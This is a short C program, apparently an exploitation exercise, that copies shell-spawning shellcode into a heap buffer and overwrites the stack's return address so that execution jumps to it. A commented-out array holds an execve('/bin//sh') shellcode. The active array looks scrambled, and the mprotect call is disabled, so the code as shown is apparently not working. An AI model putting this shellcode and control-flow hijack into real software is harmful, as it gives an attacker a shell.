#include <unistd.h>
#include <signal.h>
#include <stdlib.h>
#include <malloc.h>
#include <sys/mman.h>
#include <string.h>
#include <errno.h>

long long  *hold;
//char shellcode[] ="\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05\x48\xc7\xc0\x3c\x00\x00\x00";

char shellcode[] ="\x73\x2f\x6e\x69\x62\x2f\xbf\x48\xc1\x48\x08\xe7\xc1\x48\x11\x68\x31\x48\xe7\x89\x48\x57\x08\xef\xb0\xd2\x31\x48\xf6\x31\x48\xc0\x3b\x00\x00\x00";

void decoy(char *cx)

{
 long long *ret;
 
 hold= (long long *)&ret;
 (*hold)=(long long)cx;
  hold++;
  (*hold)=(long long)cx;
  hold++;
  (*hold)=(long long)cx;
  hold++;
  (*hold)=(long long)cx;
 hold++;
  (*hold)=(long long)cx;
 hold++;
  (*hold)=(long long)cx;

}

void main ()
{  
  int pagesize;
  char *buf;
  
  pagesize = sysconf(_SC_PAGE_SIZE);
  posix_memalign(&buf, pagesize, strlen(shellcode)+10);
  strcpy(buf,shellcode);
  
  
  //mprotect(buf, strlen(shellcode)+10, PROT_EXEC|PROT_WRITE|PROT_READ);
  /*
  mprotect - This function is called to protect the Memory
  PROT_EXEC-Pages may be executed. If we do not set this , buffer memory can not be used to execute shell code
  PROT_WRITE-Pages may be written
  PROT_READ-Pages may be read
  */
  	decoy(buf);  
  return;  
}



	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
